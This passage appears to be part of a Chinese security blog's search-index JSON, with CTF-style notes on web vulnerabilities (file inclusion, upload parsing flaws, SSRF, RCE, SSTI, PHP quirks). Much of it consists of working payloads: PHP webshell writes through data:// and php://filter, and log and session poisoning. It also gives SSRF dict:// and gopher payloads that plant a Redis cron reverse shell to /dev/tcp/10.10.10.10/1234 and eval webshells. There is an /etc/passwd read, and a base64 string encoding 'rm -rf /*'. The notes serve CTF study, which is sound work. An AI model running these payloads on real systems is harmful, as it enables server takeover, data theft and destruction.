!_,.:\n\n\ncm0gLXJmIC8q\n","categories":["Web"]},{"title":"漏洞利用","url":"/blog233.github.io/2024/10/02/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/","content":"安全无止境，继续前进吧！\n告诉你一个好消息，博士：罗德岛安全部的漏洞分析工作取得了较大进展，这离不开安全部的大家日日夜夜的付出，也离不开你对这项工作的大力支持。我们决定对一些重要且较复杂的漏洞单独剔出以进行更详细的汇总，继续努力吧，博士，我会在后方默默守护你的。……你说你刚才看到那谁了？–by Civilight Eterna\n\n伪随机漏洞有时候，我们需要一定的认证手段防范恶意攻击，比如说使用随机数；但是在同一个随机数种子下，随机数的序列是相同的；以Python为例：\nimport randomp = random.getrandbits(512) \n执行完毕后，p为512个bit位的随机数如果事先初始化随机数种子：\nimport randomrandom.seed(0)   # 这里初始化随机数种子的参数为0p = random.getrandbits(512)\n每次执行完毕后，p为512个bit位的固定数;如果生成的是一个数组，那么每次生成的数组的序列是相同的;\n文件包含漏洞认识文件包含编写常用函数并存入单个文件当中，后期直接调用文件便于重复使用该函数而无需再次编写；\n漏洞成因为了使代码更加灵活，开发人员通常会将被包含的文件设置成变量，用以实现动态调用，但正是由于这种灵活性，导致客户端可以通过调用恶意文件造成包含漏洞，对服务器实施攻击；\n包含种类\ndata包含 用于执行一句话木马，查找并获取flag；\n?file=data://text/plain,&lt;?php system(&quot;ls&quot;)?&gt;?file=data://text/plain,&lt;?php system(&quot;ls *.php&quot;)?&gt;     // 仅查找.php文件?file=data://text/plain,&lt;?php system(&quot;tac flag.php&quot;)?&gt;?file=data://text/plain,&lt;?php system(&quot;tac fl*g.*&quot;)?&gt;   // 通配符 * 绕过flag，php过滤?file=data://text/plain;base64,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4=   //绕过system，&lt;?过滤\nfilter包含 filter过滤器，一般用于获取目标网页的PHP源代码，但在不知道目标网页在哪时不太好用；\n?file=php://filter/read=convert.base64-encode/resource=index.php?file=php://filter/convert.base64-encode/resource=index.php\n有时也用于在服务器端创建php网页，或者作为转码器使用；\n?file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=index.php\nHTTP日志包含 按照nginx默认日志路径包含日志文件； 配合burpsuite使用，与data包含功能相似，伟大无需多言；\n?file=/var/log/nginx/access.log?file=/../../../access.log   // 路径穿越\n包含前，拦截http请求头，在ua信息末尾插入一句话木马（一般用来传参）后放行请求头；传参后，在日志包含口令后面添加系统命令，随后可以找到flag；\n/* 假设已经上传的参数为1 */?file=/var/log/nginx/access.log&amp;1=system(&#x27;ls *.php&#x27;);?file=/var/log/nginx/access.log&amp;1=system(&#x27;tac flag.php&#x27;);\nSSH日志包含 与http日志包含相似，利用恶意用户名注入一句话木马；\n?file=/var/log/auth.log?file=/var/log/secure\n请注意：日志文件会记录最为原始的URL请求，在浏览器地址栏中输入的地址会被URL编码，需要通过CURl或者Burp改包绕过编码\n\nsession包含php将用户session以文件的形式保存在主机中，通过php.ini文件中的session.save_path字段可以设置具体的存储位置，通过phpinfo()也可以查询到；一些可能的session文件存放路径：\n?file=/var/lib/php/sess_PHPSESSID?file=/var/lib/php/sessions/sess_PHPSESSID?file=/tmp/sess_PHPSESSID?file=/tmp/sessions/sess_PHPSESSID\n但是对于默认配置”session.upload_progress.cleanup &#x3D; on”，文件上传之后，session文件内容会立即被清空；对此，我们需要通过条件竞争，在服务器还未来得及删除我们上传的session文件内容时包含到该文件，实现恶意代码的命令执行；\n&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt;&lt;form action=&quot;------------URL-----------&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;&lt;?php system(&#x27;ls&#x27;);?&gt;&quot; /&gt;&lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;&lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;&lt;?phpsession_start();?&gt;\n利用这个脚本，随便上传一个文件（文件不能太大，不然会502报错），实际上是通过上传PHP_SESSION_UPLOAD_PROGRESS并访问&#x2F;tmp&#x2F;sess_xxx，利用burpsuite抓包后发送至Intruder实施重放攻击，不断发送访问请求，通过条件竞争实现文件包含；\n/?file=/tmp/sess_expCookie: PHPSESSID=exp\n在Cookie里设置参数PHPSESSID&#x3D;exp，php将会在服务器上创建一个文件：&#x2F;tmp&#x2F;sess_exp；\n\npear包含php&lt;&#x3D;7.3默认安装pecl&#x2F;pear；访问pearphp\n\nzip包含\n\n\n举些例子&lt;?phpif(isset($_GET[&#x27;file&#x27;]))&#123;    $file = $_GET[&#x27;file&#x27;];    $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);    $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file);    $file = str_replace(&quot;:&quot;, &quot;???&quot;, $file);    $file = str_replace(&quot;.&quot;, &quot;???&quot;, $file);    if(file_exists($file))&#123;        $content = file_get_contents($file);        if(strpos($content, &quot;&lt;&quot;)&gt;0)&#123;            die(&quot;error&quot;);        &#125;        include($file);    &#125;    &#125;else&#123;    highlight_file(__FILE__);&#125;考点：条件竞争\nCTFshow_Web82~86 WP参考链接：https://blog.csdn.net/Myon5/article/details/140207360\n&lt;?phpif(isset($_GET[&#x27;file&#x27;]))&#123;    $file = $_GET[&#x27;file&#x27;];    $content = $_POST[&#x27;content&#x27;];    $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);    $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file);    $file = str_replace(&quot;:&quot;, &quot;???&quot;, $file);    $file = str_replace(&quot;.&quot;, &quot;???&quot;, $file);    file_put_contents(urldecode($file), &quot;&lt;?php die(&#x27;大佬别秀了&#x27;);?&gt;&quot;.$content);&#125;else&#123;    highlight_file(__FILE__);&#125;解题思路：    利用filter过滤器，将&quot;&lt;?php die();?&gt;&quot;与变量content的编码方式互换，让前者乱码无法执行，以此绕过死亡exit；    由于存在urldecode()函数，需要对变量file进行一次url编码后传入；payload1:    GET部分：?file=php://filter/write=convert.base64-decode/resource=3.php    -&gt;?file=%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%64%25%36%33%25%36%66%25%36%65%25%37%36%25%36%35%25%37%32%25%37%34%25%32%65%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%34%25%36%35%25%36%33%25%36%66%25%36%34%25%36%35%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%37%33%25%36%38%25%36%35%25%36%63%25%36%63%25%32%65%25%37%30%25%36%38%25%37%30    POST部分：content=&lt;?php eval($_POST[1]); ?&gt;    -&gt;content=11PD9waHAgZXZhbCgkX1BPU1RbMV0pOyA/Pg==    // 前面添加&#x27;11&#x27;是为了抵消末尾处的两个&#x27;=&#x27;导致的content写入失败问题    运行后，访问url/3.php执行系统命令：        /3.php?1=system(&quot;ls&quot;);        /3.php?1=system(&quot;tac flag.php&quot;);payload2:    与payload1同理，只是改用了rot13编码；    GET部分：?file=php://filter/write=convert.rot13-decode/resource=shell.php    -&gt;?file=%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%64%25%36%33%25%36%66%25%36%65%25%37%36%25%36%35%25%37%32%25%37%34%25%32%65%25%37%32%25%36%66%25%37%34%25%33%31%25%33%33%25%32%64%25%36%34%25%36%35%25%36%33%25%36%66%25%36%34%25%36%35%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%37%33%25%36%38%25%36%35%25%36%63%25%36%63%25%32%65%25%37%30%25%36%38%25%37%30    POST部分：content=&lt;?php eval($_POST[1]);?&gt;    -&gt;content=&lt;?cuc riny($_CBFG[1]);?&gt;    运行后，访问url/shell.php执行系统命令：        /shell.php?1=system(&quot;ls&quot;);        /shell.php?1=system(&quot;tac flag.php&quot;);\n&lt;?phphighlight_file(__FILE__);error_reporting(0);function filter($x)&#123;     // 自定义函数    if(preg_match(&#x27;/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i&#x27;,$x))&#123;        die(&#x27;too young too simple sometimes naive!&#x27;);    &#125;&#125;$file=$_GET[&#x27;file&#x27;];$contents=$_POST[&#x27;contents&#x27;];filter($file);file_put_contents($file, &quot;&lt;?php die();?&gt;&quot;.$contents);解题思路：    与上题类似，但过滤了base64和rot13，使用其它编码方式；payload:    GET部分：        ?file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=shell.php    POST部分：         contents=?&lt;hp pe@av(l_$EG[T]1;)&gt;?   // 将一句话木马从 UCS-2LE 编码转换为 UCS-2BE 编码    运行后，访问url/shell.php执行系统命令：        /shell.php?1=system(&quot;ls&quot;);        /shell.php?1=system(&quot;tac flag.php&quot;);\n\n文件上传漏洞通过在上传的文件中插入一句话木马，在缺乏防护的情况下，可以实现对服务器的命令控制；\n解析漏洞配合各种Web容器的解析漏洞，可以更好地利用上传漏洞；\nIIS解析漏洞针对IIS6.0，其在解析文件时存在以下两种漏洞：\n\n目录解析漏洞 *.asa或*.asp格式的文件夹下的任意文件均能被当作asp文件解析；\n\n文件名解析漏洞 扩展名为*.asp;1.jpg的文件会被当做asp文件解析；\n\n畸形解析漏洞 微软发布了IIS7.0修补了IIS6.0的解析漏洞，结果IIS7.0爆出了更严重的畸形解析漏洞：\n 在IIS7.0中，在默认Fast-CGI开启状况下，在上传的文件中写入一句话木马（假设上传传入参数为shell）， 随后访问”上传路径&#x2F;文件名.后缀名&#x2F;shell.php”，文件当中的一句话木马将被执行。\n\n\nApache（阿帕奇）解析漏洞Apache 1.x和Apache 2.x存在解析漏洞：\nApache依赖于安装目录下的”&#x2F;conf&#x2F;mime.types”文件识别文件扩展名；Apache在解析文件时有一个原则：如果遇到不认识的扩展名，就从后向前解析直至遍历到认识的扩展名；如果都不认识，就会暴露目标文件的源代码；\n比如我们编写一个”1.php.rar”文件：\n&lt;?php    phpinfo();?&gt;\n访问”url&#x2F;1.php.rar”，理应会执行下载文件的操作，但Apache却显示了phpinfo()的内容，因为Apache不识别.rar格式文件，于是读取到了.php后缀，将文件识别为php代码文件并执行；\nPHP CGI解析漏洞Nginx作为一款高性能Web服务器，一般用作PHP的解析容器，其曾被曝出PHP CGI解析漏洞：PHP当中有一个关键选项：”cgi.fi: x_pathinfo”在访问”url&#x2F;1.jpg.1.php”时，1.jpg会被当做php脚本解析，这意味着黑客只要上传图片木马并访问”url&#x2F;xxx.php”，就能拿到网站的WebShell；\n绕过上传客户端检测\nFireBug攻击 一款支持火狐和谷歌的浏览器插件，通过删除客户端的javascript验证实现绕过上传，本质上是禁用本地javascript；\n中间人攻击 与FireBug不同，burpsuite是对传输层做手脚，通过拦截、修改HTTP请求实现绕过上传；\n\n所以说，从安全角度来看，任何客户端验证都是不安全的，这种验证方式只能用来防止用户输入错误，减小服务器的开销，而真正的防御要靠服务端验证；\n服务端检测\n黑白名单验证；\nMIME验证；\n目录验证；\n截断上传攻击；\n\n文本编辑器上传漏洞防护策略针对系统运行\n禁用上传目录的执行功能；\n使用白名单策略检查文件类型；\n使用随机数改写文件名称及路径；\n单独设置文件服务器的域名；\n\n针对系统开发\n同时在客户端和服务端设置严格的检查；\n阻拦截断攻击；\n检查http包头以及上传文件的大小；\n\n针对系统维护\n利用扫描器，及时发现并修复漏洞；\n定期查看系统日志；\n及时更新软件版本与补丁；\n\nXSS漏洞跨站脚本漏洞；过滤验证很重要，但如果只设置javascript前端验证，忽略了后端验证，就会留下漏洞。\n比如说，我们要在网页上输入一段信息，javascript验证可以在提交数据之前过滤掉敏感字符，这样主要是为了防止用户输入错误。\n然而，绕过javascript验证的思路也非常简单：先提交合法数据，再拦截上传的http(s)请求并将原先输入的合法数据修改为敏感数据，最后上传篡改后的http(s)请求，就能够成功提敏感数据，造成XSS漏洞。\n所以，设置服务器端验证是非常重要的攻击防护手段，每一位web开发人员都应当具有这样的意识。\n利用方式\n页面劫持；\n网络钓鱼；\n权限维持；\n\n防护策略\n过滤输入内容；\n对输出内容进行html编码；\n对重要的cookie设置HttpOnly, 防止客户端通过document.cookie读取cookie；\n\nCSRF漏洞跨站请求伪造漏洞；黑客通过盗用身份建立会话，进行一系列非法操作，或者欺骗用户访问带有木马的url链接；传说中的钓鱼链接就是这样来的；一般用于窃取cookie；\nurl + /vul/csrf/csrfget/csrf_get_edit.php? + 内容\n\n防护策略\n要求用户进行二次确认；\n阻止不明外域的访问；\n提交请求时要求附加只有在本域才能获取的信息；\n增加token（令牌）验证（token需要随机生成，值足够大，用后需销毁）；\n增加验证码；请注意：当网站同时存在XSS漏洞和CSRF漏洞时，token验证机制将会失效！\n\n逻辑错误漏洞当一个系统的功能太多的时候，难免会出现由开发人员思路错误或思考不全面导致的程序逻辑问题，导致了逻辑漏洞；\n\n漏洞挖掘发现网页功能-&gt;了解业务流程-&gt;拦截、篡改http(s)请求；\n\nSSRF漏洞服务端请求伪造漏洞；如果服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制，黑客可以通过伪造服务端请求对其他服务器实施攻击，这种漏洞一般用于攻击与外界隔离的内部服务器，其访问地址一般要求为本地回环地址（内网地址）；\n漏洞利用方式\n探测内网信息；\n窃取敏感内容；\n作为跳板，攻击其他网站或应用；\n\nfilter_var()函数使用特定的过滤器过滤一个变量；\n内置常量\nFILTER_VALIDATE_IP： 验证是否为有效的IP地址；\nFILTER_FLAG_NO_PRIV_RANGE： 排除私有IP地址；\nFILTER_FLAG_NO_RES_RANGE： 排除保留IP地址 如回环地址’127.0.0.1’；\n\n协议利用Dict协议探测端口和服务指纹dict://127.0.0.1:22dict://172.22.10.10:3306dict://127.0.0.1:6379/info\n攻击Redis，写入定时任务，进行反弹shellcentos系统定时任务的路径为：&#x2F;var&#x2F;spool&#x2F;crondebian系统定时任务的路径为：&#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs\ndict://127.0.0.1:6379/config:set:dbfilename:rootdict://127.0.0.1:6379/config:set:dir:/var/spool/crondict://127.0.0.1:6379/set:test:&quot;\\n\\n*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/10.10.10.10/1234 0&gt;&amp;1\\n\\n&quot;dict://127.0.0.1:6379/save\n注意：若payload存在被转义或过滤的情况，可利用16进制写入内容\ndict://127.0.0.1:6379/set:test:&quot;\\n\\n\\x2a/1\\x20\\x2a\\x20\\x2a\\x20\\x2a\\x20\\x2a\\x20/bin/bash\\x20\\x2di\\x20\\x3e\\x26\\x20/dev/tcp/10.10.10.10/1234\\x200\\x3e\\x261\\n\\n&quot;\n攻击Redis，写入webshelldict://127.0.0.1:6379/config:set:dbfilename:test.phpdict://127.0.0.1:6379/config:set:dir:/var/www/htmldict://127.0.0.1:6379/set:test:&quot;\\n\\n&lt;?php @eval($_POST[1]);?&gt;\\n\\n&quot;dict://127.0.0.1:6379/save\n若存在过滤， 则利用16进制内容写入：\ndict://127.0.0.1:6379/set:test:&quot;\\n\\n\\x3c\\x3f\\x70\\x68\\x70\\x20\\x40\\x65\\x76\\x61\\x6c\\x28\\x24\\x5f\\x50\\x4f\\x53\\x54\\x5b\\x78\\x5d\\x29\\x3b\\x3f\\x3e\\n\\n&quot;\n攻击Redis，写入ssh公钥操作和写入定时任务相似；\nGopher协议用来打无密码MySQL或者Redis；\ngopher://ip:port/_TCP IP数据流eg:gopher://127.0.0.1:3306/gopher\n数据流构造一般使用：\nselect &quot;&lt;?php @eval($_POST[&#x27;cmd&#x27;]);?&gt;&quot; into outfile &#x27;/var/www/html/cmd.php&#x27;;-&gt;gopher://127.0.0.1/_\n\nFile协议用于读取文件内容；\nfile:///etc/passwd    // 是的你没看错，三个&#x27;/&#x27;\n举些例子（以下内容均来自CTFshow）&lt;?phperror_reporting(0);highlight_file(__FILE__);$url=$_POST[&#x27;url&#x27;];$ch=curl_init($url);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);$result=curl_exec($ch);curl_close($ch);echo ($result);?&gt;payload1:    url=http://127.0.0.1/flag.phppayload2:    url=http://127.255.255/flag.php\n&lt;?phperror_reporting(0);highlight_file(__FILE__);$url=$_POST[&#x27;url&#x27;];$x=parse_url($url);if($x[&#x27;scheme&#x27;]===&#x27;http&#x27;||$x[&#x27;scheme&#x27;]===&#x27;https&#x27;)&#123;if(!preg_match(&#x27;/localhost|1|0|。/i&#x27;, $url))&#123;$ch=curl_init($url);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);$result=curl_exec($ch);curl_close($ch);echo ($result);&#125;else&#123;    die(&#x27;hacker&#x27;);&#125;&#125;else&#123;    die(&#x27;hacker&#x27;);&#125;?&gt;解题思路：    正则过滤不允许直接使用本地回环地址，通过使用ip地址解析为127.0.0.1的网址进行302跳转绕过；payload（以下任选其一即可）:    url=http://sudo.cc/flag.php    url=http://spoofed.burpcollaborator.net/flag.php    url=http://safe.taobao.com/flag.php\n&lt;?phperror_reporting(0);highlight_file(__FILE__);$url=$_POST[&#x27;url&#x27;];$x=parse_url($url);if($x[&#x27;scheme&#x27;]===&#x27;http&#x27;||$x[&#x27;scheme&#x27;]===&#x27;https&#x27;)&#123;$host=$x[&#x27;host&#x27;];if((strlen($host)&lt;=5))&#123;$ch=curl_init($url);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);$result=curl_exec($ch);curl_close($ch);echo ($result);&#125;else&#123;    die(&#x27;hacker&#x27;);&#125;&#125;else&#123;    die(&#x27;hacker&#x27;);&#125;?&gt;解题思路：    Host部分存在字数限制，注意绕过；    payload:    url=http://127.1/flag.php\n&lt;?phperror_reporting(0);highlight_file(__FILE__);$url=$_POST[&#x27;url&#x27;];$x=parse_url($url);if($x[&#x27;scheme&#x27;]===&#x27;http&#x27;||$x[&#x27;scheme&#x27;]===&#x27;https&#x27;)&#123;$host=$x[&#x27;host&#x27;];if((strlen($host)&lt;=3))&#123;$ch=curl_init($url);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);$result=curl_exec($ch);curl_close($ch);echo ($result);&#125;else&#123;    die(&#x27;hacker&#x27;);&#125;&#125;else&#123;    die(&#x27;hacker&#x27;);&#125;?&gt;解题思路：    更严格的字数限制，注意绕过；payload1:    url=http://0/flag.phppayload2:    url=http://0.0/flag.php\n&lt;?phperror_reporting(0);highlight_file(__FILE__);$url=$_POST[&#x27;url&#x27;];$x=parse_url($url);if($x[&#x27;scheme&#x27;]===&#x27;http&#x27;||$x[&#x27;scheme&#x27;]===&#x27;https&#x27;)&#123;$ip = gethostbyname($x[&#x27;host&#x27;]);echo &#x27;&lt;/br&gt;&#x27;.$ip.&#x27;&lt;/br&gt;&#x27;;if(!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) &#123;    die(&#x27;ip!&#x27;);&#125;echo file_get_contents($_POST[&#x27;url&#x27;]);&#125;else&#123;    die(&#x27;scheme&#x27;);&#125;?&gt;解题思路：    存在filter_var()过滤，要求url中不能出现内网IP地址，必须填公网IP；    通过网络地址翻译技术（如DNS重绑定），无需搭建服务器就可以得到对应的公网IP地址；    工具地址：https://lock.cmpxchg8b.com/rebinder.html?tdsourcetag=s_pctim_aiomsgpayload:    url=http://7f000001.01010117.rbndr.us/flag.php\n注：可能会出现定位失败的情况，多试几次即可，或者使用burpsuite实施重放攻击\n&lt;?phperror_reporting(0);highlight_file(__FILE__);$url=$_POST[&#x27;url&#x27;];$x=parse_url($url);if(preg_match(&#x27;/^http:\\/\\/ctf\\..*show$/i&#x27;,$url))&#123;    echo file_get_contents($url);&#125;payload:    url=http://ctf.@127.0.0.1/flag.php?show\ngopher://127.0.0.1:3306/_%25a3%2500%2500%2501%2585%25a6%25ff%2501%2500%2500%2500%2501%2521%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2572%256f%256f%2574%2500%2500%256d%2579%2573%2571%256c%255f%256e%2561%2574%2569%2576%2565%255f%2570%2561%2573%2573%2577%256f%2572%2564%2500%2566%2503%255f%256f%2573%2505%254c%2569%256e%2575%2578%250c%255f%2563%256c%2569%2565%256e%2574%255f%256e%2561%256d%2565%2508%256c%2569%2562%256d%2579%2573%2571%256c%2504%255f%2570%2569%2564%2505%2532%2537%2532%2535%2535%250f%255f%2563%256c%2569%2565%256e%2574%255f%2576%2565%2572%2573%2569%256f%256e%2506%2535%252e%2537%252e%2532%2532%2509%255f%2570%256c%2561%2574%2566%256f%2572%256d%2506%2578%2538%2536%255f%2536%2534%250c%2570%2572%256f%2567%2572%2561%256d%255f%256e%2561%256d%2565%2505%256d%2579%2573%2571%256c%254a%2500%2500%2500%2503%2573%2565%256c%2565%2563%2574%2520%2527%253c%253f%2570%2568%2570%2520%2565%2576%2561%256c%2528%2524%255f%2550%254f%2553%2554%255b%2563%256d%2564%255d%2529%253b%253f%253e%2527%2520%2569%256e%2574%256f%2520%256f%2575%2574%2566%2569%256c%2565%2520%2527%252f%2576%2561%2572%252f%2577%2577%2577%252f%2568%2574%256d%256c%252f%2563%256d%2564%252e%2570%2568%2570%2527%253b%2501%2500%2500%2500%2501\n\nRCE漏洞远程代码执行漏洞；攻击者可以直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统；前面的命令执行就是RCE的一部分；\n常见危险函数系统命令执行函数\nshell_exec()：将字符串作为OS命令执行，无回显；\nsystem()：将字符串作为OS命令执行，且返回命令执行结果；\nexec()：将字符串作为OS命令执行，但是只返回执行结果的最后一行(约等于无回显)；\npassthru()：将字符串作为OS命令执行，只调用命令不返回任何结果，但把命令的运行结果原样输出到标准输出设备上；\npopen()：打开进程文件指针；\nproc_open()：与popen()类似；\npcntl_exec()：在当前进程空间执行指定程序；\n反引号&#96;&#96;：其中的字符串会被解析为OS命令，一般配合echo命令使用；\n\n代码执行函数\neval()：将字符串作为php代码执行；\nassert()：将字符串作为php代码执行；\npreg_replace()：正则匹配替换字符串，一般用于过滤；\ncreate_function()：主要创建匿名函数；\ncall_user_func()：回调函数，第一个参数为函数名，第二个参数为函数的参数；\ncall_user_func_array()：回调函数，第一个参数为函数名，第二个参数为函数参数的数组；\n\nRCE绕过\n管道符\n空格过滤\n取反绕过\n异或绕过\n自增绕过\n黑名单绕过\nbase和hex编码绕过\n正则匹配绕过\n回溯绕过\n\nRCE命令执行\n无回显RCE\n无参数RCE\n无字母数字RCE\n\n危害\n继承Web服务器程序权限，去执行系统命令；\n继承Web服务器权限，读写文件；\n反弹shell；\n控制整个网站甚至是服务器；\n\n防护策略\n对用户的输入作严格的过滤，如白名单策略；\n尽量避免使用容易产生漏洞的危险函数；\n保证用户不调用控制危险函数的传参；\n\nSSTI漏洞服务器端模板注入漏洞；服务端接收攻击者的恶意输入以后，未经任何处理就将其作为 Web 应用模板内容的一部分，模板引擎在进行目标编译渲染的过程中，执行了攻击者插入的可以破坏模板的语句，从而达到攻击的目的；\nflask框架漏洞// 命令执行&#123;&#123; config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read() &#125;&#125;&#123;&#123; config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;tac flag&#x27;).read() &#125;&#125;\n\nXXE漏洞XML外部实体注入漏洞；由程序在解析输入的XML数据时，解析了攻击者伪造的外部实体而产生；\n漏洞特征\nurl以.ashx为后缀；\n响应体是xml；\n\n&lt;- To be continued  _(:3 ∠)__\n  く__,.ヘヽ.        /  ,ー､ 〉\n           ＼ ', !-─‐-i  /  /´\n           ／｀ｰ'       L/／｀ヽ､\n         /   ／,   /|   ,   ,       ',\n       ｲ   / /-‐/  ｉ  L_ ﾊ ヽ!   i\n        ﾚ ﾍ 7ｲ｀ﾄ   ﾚ'ｧ-ﾄ､!ハ|   |\n          !,/7 '0'     ´0iソ|    |\n          |.从\"    _     ,,,, / |./    |\n          ﾚ'| i＞.､,,__  _,.イ /   .i   |\n            ﾚ'| | / k_７_/ﾚ'ヽ,  ﾊ.  |\n              | |/i 〈|/   i  ,.ﾍ |  i  |\n             .|/ /  ｉ：    ﾍ!    ＼  |\n              kヽ>､ﾊ    _,.ﾍ､    /､!\n              !'〈//｀Ｔ´', ＼ ｀'7'ｰr'\n              ﾚ'ヽL__|___i,___,ンﾚ|ノ\n                  ﾄ-,/  |___./\n                  'ｰ'    !_,.:\n\n\n5piv5L2g77yf5bCP5YWU5a2Q77yM5L2g5p6c54S25pyJ5Yeg5YiG5aW555qE5b2x5a2Q77yB\n","categories":["Web"]},{"title":"PHP大排档","url":"/blog233.github.io/2024/11/10/PHP%E5%A4%A7%E6%8E%92%E6%A1%A3/","content":"安全无止境，继续前进吧！\n（听说岛上来了几位异世界的大厨？）\n\n信息收集展开攻击之前的必要步骤；\n源码泄露\n开发注释未及时删除，按F12可以查看源码获取信息；\n\n有些网页设置了js前台绕过无法按F12，在网址前端添加’view-source:’或者前往浏览器设置关闭javascript即可绕过；\n\n对于缺乏防护的网页，通过以下访问手段可以下载网页源代码；\nurl/index.phpsurl/www.zip\n\n版本控制泄露\nurl/.git/index.php\n\n敏感数据泄露\nrobots后台泄露 robots.txt规定了用户能够访问网页的范围； 缺乏防护时，访问robots.txt可以获取到网页关键路径等信息；\nurl/robots.txt\n\n探针泄露 开发完成后，未及时删除的探针可能导致信息泄露； 记得删除探针，或者将探针命名为复杂不易猜的名字；\nurl/tz.php\n\ncookie泄露 cookie的本质是一个文档，它会记录用户的访问信息； 如果没有对cookie设置HttpOnly属性，一旦被截获就会造成信息泄露；\n\n数据库恶意下载 mdb文件是早期asp + access架构的数据库文件，文件泄露相当于数据库被脱裤了； 与此同时，备份的sql文件也可能会泄露敏感信息； 网页按F12可以查看到当前网页的cookie键和值；\nurl/db/db.mdburl/backup.sql\n\n暴力破解想要实现网页爆破，你需要学会使用Burpsuite进行重放攻击；\n\n纯数字情形 对于纯数字组合的信息，可以使用Burpsuite设置区间构造字典实施爆破。爆破完成后，通过返回长度可以很容易地确认密码，随后查看响应内容获取信息。\n\n一般情形 如果爆破内容包含了字母以及特殊字符，也可以采用上面的方法，但是比较费时间； 最好调用自己提前准备好的字典，展开有针对性的爆破攻击，后面的操作方法同上。\n\n随机数情形 如果要爆破的信息是用随机数种子动态生成的，就不要头铁爆破了（这里用到了伪随机数漏洞，详见下文）。先在本地搭建好PHP环境或Linux环境，然后调用靶场的随机数种子生成随机数，最后传参。\n\n\nPHP特性变量特性\n默认为字符串类型；\n\n使用不同进制、不同类型、有无+号表示同一个数，含义相同；\n\n数组绕过 相同变量名不同类型，被认为是不同变量；数组内没有元素时会被认为是空字符；\n\n变量覆盖\n\n\n弱比较数组弱比较intval()函数，用于获取参数的整数值；该函数转换数组类型时，不关心数组中的内容，只判断数组中有没有元素；如果$base为0，则$var中存在字母的话遇到字母就停止读取 但是e这个字母比较特殊，在PHP中可以不是科学计数法’0e’；\nmd5弱比较MD5加密漏洞，不同的字符串可能拥有相同的md5值；\n\n‘0e’绕过 如果MD5值开头为’0e’，那么md5()将会被绕过并返回’NULL’；\n\n特殊浮点数常量 PHP内置了’NAN’’ISF’两个特殊浮点数常量； 将这两个常量转成其他类型之后的md5值与原先的浮点类型md5值相等;\n\n\n相对地，采用强比较时，本质上是将变量转化为字符串后再进行比较\nsha1弱比较与MD5弱比较类似，不同的字符串可能拥有相同的sha1值；\n\n逻辑弱比较在进行多条件比较时，PHP只会判断第一个条件是否为真；当第一个条件成立时，不会判断后面的条件；\n\n函数特性\n常见功能函数\nhex2bin(hex)   // 将十六进制数hex转换成字符串strrev()   // 将字符串倒序排列extract($_GET)  // 允许用户进行变量覆盖file_put_contents()  // 允许用户写入文件\n\nsubstr($v2, num) 截掉字符串v2的前num个字符； 如果要保留完整内容。需要在字符串前添加num个字符绕过截断； 当num &lt; 0时，则截掉字符串v2的后num个字符，需要在字符串后面添加；\n\nereg( string $pattern, string $string[, array &amp;$regs] ) 正则表达式匹配； 如果在’string’中找到’pattern’模式的匹配，则返回字符串的长度，没找到或出错则返回 FALSE; 如果没有传递入可选参数’regs’或者所匹配的字符串长度为’0’，则本函数返回’1’； 该函数存在NULL截断漏洞：当字符串变量出现’%00’时，字符串会被截断，后续字符串内容将不再读取；\n\nforward_static_call_array() 允许用户调用静态方法并且将数组作为参数； 在php当中,默认命名空间是’\\‘，所有原生函数和类都在这个命名空间中； 普通调用一个函数，如果直接写函数名调用，调用的时候其实相当于写了一个相对路径；\n\nini_set($name, $value) 允许修改php.ini的部分配置信息； 该函数可用于异常执行，即自行修改报错信息error_log的保存路径，写入报错信息并包含要执行的PHP代码，从而实现getshell；\n ?name=error_log=&amp;value=/var/www/html/shell.php\n\nsystem() 将字符串识别为PHP代码并执行； 该函数存在截断问题：如果字符串中含有’%00’，就会造成截断问题，触发异常；\n\ncall_user_func($callback, $args) 把第一个参数作为回调函数调用； 第一个参数callback是被调用的回调函数，其余参数是回调函数的参数；\n\n\n内置类反射类ReflectionClass()ReflectionMethod()ReflectionFunction()ReflectionParameter()\n\n原生类\nException() &#x2F; Error() 